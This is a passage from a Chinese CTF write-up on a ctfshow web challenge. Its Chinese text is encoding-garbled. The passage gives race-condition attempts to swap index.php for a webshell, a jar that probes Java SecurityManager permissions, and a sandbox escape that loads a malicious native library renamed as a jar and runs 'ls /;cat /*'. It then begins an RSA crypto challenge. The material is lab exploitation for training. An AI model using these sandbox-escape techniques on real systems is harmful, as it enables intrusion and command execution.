double-quoted-string">"/"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">".jar"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span>php<span class="token operator">.</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>java<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>security<span class="token operator">/</span>policy<span class="token operator">/</span>limited<span class="token operator">/</span>local_policy<span class="token operator">.</span>jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰“pharååºåˆ—åŒ–ï¼Œä½†æ˜¯æ²¡æœ‰ç±»å¯ä»¥åˆ©ç”¨å•Šã€‚ã€‚</p><p>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬æ¡ä»¶ç«äº‰<code>90b5e0c104040820ae639c2f25f740d9.jar</code>ï¼Œæ˜¯å¦å¯ä»¥å®ç°æ›¿æ¢ index.php ä¸ºæˆ‘ä»¬çš„é©¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_rename</span><span class="token punctuation">(</span><span class="token variable">$old_name</span><span class="token punctuation">,</span><span class="token variable">$new_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^[a-fA-F0-9]&#123;32&#125;\.jar$/"</span><span class="token punctuation">,</span> <span class="token variable">$new_name</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/<span class="token interpolation"><span class="token variable">$new_name</span></span>"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/usr/local/java/bin/java -Djava.security.manager -Djava.security.policy==/usr/local/bin/ctfer.policy -jar uploads/<span class="token interpolation"><span class="token variable">$new_name</span></span> 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">nl2br</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$output</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>&lt;br>Jar file executed successfully."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Invalid jar name"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">file_rename</span><span class="token punctuation">(</span><span class="token variable">$new_name</span><span class="token punctuation">,</span><span class="token variable">$old_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¦å¹¶å‘è¿™å‡ ä¸ªæ¥å£</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">executeï¼šé‡å‘½å<span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>index<span class="token operator">.</span>phpä¸º<span class="token number">90</span>b5e0c104040820ae639c2f25f740d9<span class="token operator">.</span>jardeleteï¼šåˆ é™¤<span class="token number">90</span>b5e0c104040820ae639c2f25f740d9<span class="token operator">.</span>jaruploadï¼šä¸Šä¼ æˆ‘ä»¬çš„é©¬<span class="token number">90</span>b5e0c104040820ae639c2f25f740d9<span class="token operator">.</span>jarï¼Œè®©ç¬¬äºŒæ¬¡renameæ›¿æ¢index<span class="token operator">.</span>phpä¸ºæˆ‘ä»¬çš„é©¬<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯è¿™é‡Œå°è¯•ç«äº‰è¿˜æ˜¯å¤±è´¥äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Œå†™ä¸ªçœŸçš„ 90b5e0c104040820ae639c2f25f740d9.jar åŒ… sleep è¯•è¯•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">uploadï¼šä¸Šä¼ æˆ‘ä»¬çš„<span class="token number">90</span>b5e0c104040820ae639c2f25f740d9<span class="token operator">.</span>jarexecuteï¼šé‡å‘½å<span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>index<span class="token operator">.</span>phpä¸º<span class="token number">90</span>b5e0c104040820ae639c2f25f740d9<span class="token operator">.</span>jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šé¢ä¸¤ä¸ªç«äº‰æ‰§è¡Œï¼Œç»“æœæ˜¯æŠŠindex.phpåˆ æ‰äº†</p><br><p>â€ä¸éœ€è¦ æ‰«æ çˆ†ç ´ ç«äº‰ ç›²æ³¨â€œ</p><p>å›è¿‡å¤´æ¥è¿˜æ˜¯è¦ç»• security.policy ï¼Œå‚è€ƒ<a href="http://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">http://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8</a></p><p>ç ”ç©¶äº†åŠå¤©çš„æ²™ç®±é€ƒé€¸ï¼Œå”¯ä¸€æ²¡è¯•çš„å°±æ˜¯è°ƒç”¨æœ¬åœ°æ–¹æ³•ç»•è¿‡</p><p>éªŒä¸€ä¸‹æƒé™</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FilePermission</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">ReflectPermission</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketPermission</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">Permission</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span><span class="token class-name">SecurityPermission</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PropertyPermission</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> shell <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SecurityManager</span> securityManager <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Permission</span> permission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilePermission</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/uploads/-"</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>permission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥ç½‘ç»œè¿æ¥æƒé™</span>        <span class="token class-name">Permission</span> netPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SocketPermission</span><span class="token punctuation">(</span><span class="token string">"localhost:80"</span><span class="token punctuation">,</span> <span class="token string">"connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>netPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥è¿è¡Œæ—¶æƒé™</span>        <span class="token class-name">RuntimePermission</span> runtimePermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"setSecurityManager"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>runtimePermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥å±æ€§è®¿é—®æƒé™</span>        <span class="token class-name">Permission</span> propertyPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PropertyPermission</span><span class="token punctuation">(</span><span class="token string">"my.property"</span><span class="token punctuation">,</span> <span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>propertyPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥åå°„æƒé™</span>        <span class="token class-name">Permission</span> reflectionPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectPermission</span><span class="token punctuation">(</span><span class="token string">"suppressAccessChecks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>reflectionPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥é€€å‡ºè™šæ‹Ÿæœºçš„æƒé™</span>        <span class="token class-name">RuntimePermission</span> exitVMPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"exitVM"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>exitVMPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥è®¾ç½®çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨çš„æƒé™</span>        <span class="token class-name">RuntimePermission</span> setContextClassLoaderPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"setContextClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>setContextClassLoaderPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥åˆ›å»ºç±»åŠ è½½å™¨çš„æƒé™</span>        <span class="token class-name">RuntimePermission</span> createClassLoaderPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"createClassLoader"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>createClassLoaderPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥æƒé™æ£€æŸ¥æƒé™</span>        <span class="token class-name">RuntimePermission</span> permissionCheckPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"checkPermission"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>permissionCheckPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥æ‰“å¼€ URL è¿æ¥çš„æƒé™</span>        <span class="token class-name">Permission</span> urlPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SocketPermission</span><span class="token punctuation">(</span><span class="token string">"www.example.com:80"</span><span class="token punctuation">,</span> <span class="token string">"connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>urlPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥è®¾ç½®å®‰å…¨ç­–ç•¥çš„æƒé™</span>        <span class="token class-name">Permission</span> securityPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecurityPermission</span><span class="token punctuation">(</span><span class="token string">"setPolicy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>securityPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// æ£€æŸ¥åŠ è½½æœ¬åœ°åº“çš„æƒé™</span>        <span class="token class-name">RuntimePermission</span> loadLibraryPermission <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RuntimePermission</span><span class="token punctuation">(</span><span class="token string">"loadLibrary.YourLibraryName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            securityManager<span class="token punctuation">.</span><span class="token function">checkPermission</span><span class="token punctuation">(</span>loadLibraryPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šä¼  jar åŒ…æ‰§è¡Œï¼Œå‘ç°æœ‰ loadLibrary çš„æƒé™å’Œ uploads ç›®å½•çš„è¯»å–æƒé™ï¼Œè¯´æ˜å¯ä»¥æ‰“æœ¬åœ°æ–¹æ³•è°ƒç”¨</p><p>ä¾æ®å‚è€ƒæ–‡ç« ï¼Œå‡†å¤‡ä¸€ä¸ªæ¶æ„ so æ”¹æˆ jar åç¼€ä¸Šä¼ ï¼Œè¿™é‡Œç›´æ¥ç”¨å®˜æ–¹æä¾›çš„ <a href="https://ctfshow-1257200238.cos.ap-shanghai.myqcloud.com/static/file/dsbctf/exp/CTFshowCodeManager.jar">CTFshowCodeManager.jar</a> äº†</p><p>ç„¶åæ„é€ å¤–éƒ¨ JavaEngine.jar æ–‡ä»¶</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"/var/www/html/uploads/CTFshowCodeManager.jar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">native</span> <span class="token class-name">String</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"ls /;cat /*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆä¸Šä¼ æ¶æ„ so çš„ jarï¼Œå†æ‰§è¡Œå¤–éƒ¨ jar å³å¯ getshell</p><p><img src="/blog/2024/11/11/ctfshow-%E5%8D%95%E8%BA%AB%E6%9D%AF/image-20241113135344339.png" alt="image-20241113135344339"></p><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç­¾åˆ°Â·ä¸€æŠŠæ¢­"><a href="#ç­¾åˆ°Â·ä¸€æŠŠæ¢­" class="headerlink" title="ç­¾åˆ°Â·ä¸€æŠŠæ¢­"></a>ç­¾åˆ°Â·ä¸€æŠŠæ¢­</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#å°é¼ï¼Œ24å²ã€‚ç½‘å®‰ä¸“ä¸šold star.æœ€è¿‘å…¥å‘ctfï¼Œæƒ³ä½“éªŒä¸€æŠŠæ¢­çš„æ„Ÿè§‰ã€‚äºæ˜¯ä»–çš„æœ‹å‹ç»™ä»–æ‰¾æ¥äº†cahtylinå…ˆç”Ÿã€‚cahtylinå…ˆç”Ÿå¬é—»ï¼Œæ¬£ç„¶å†™ä¸‹æ­¤é¢˜ã€‚</span>falg <span class="token operator">=</span> <span class="token string">'?????'</span>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>falg<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token comment">#ä»€ä¹ˆå¹´ä»£äº†è¿˜åœ¨åšä½åŠ å¯†æŒ‡æ•°çš„ä¼ ç»ŸRSAï¼Ÿæˆ‘å°±çŒœå‡ºé¢˜äººåœ¨100ä»¥å†…æ‰¾ä¸ªdç„¶åæ¨¡æ‹Ÿå‡ºeåŠ å¯†çš„ã€‚</span><span class="token 